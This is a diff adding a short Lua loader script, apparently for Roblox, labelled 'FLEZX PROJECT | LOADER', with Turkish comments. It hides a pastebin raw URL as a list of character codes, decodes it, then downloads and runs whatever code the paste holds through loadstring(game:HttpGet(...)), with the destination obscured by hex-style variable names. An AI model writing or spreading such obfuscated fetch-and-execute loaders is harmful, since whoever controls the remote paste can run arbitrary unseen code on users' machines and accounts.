@@ -1,0 +1,21 @@
+-- [[ FLEZX PROJECT |  LOADER ]] --
+ 
+local _0xData = {104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47} 
+local _0xKey = "QbQ1VQwM"
+
+local function _0xDecode(_0xT)
+    local _0xR = ""
+    for _, _0xV in ipairs(_0xT) do _0xR = _0xR .. string.char(_0xV) end
+    return _0xR .. _0xKey
+end
+
+local _0xFinalURL = _0xDecode(_0xData)
+
+-- Asıl kod yükleniyor
+local _0xSuccess, _0xError = pcall(function()
+    return loadstring(game:HttpGet(_0xFinalURL))()
+end)
+
+if not _0xSuccess then
+    warn("Kritik Hata: Sunucu baglantisi reddedildi.")
+end
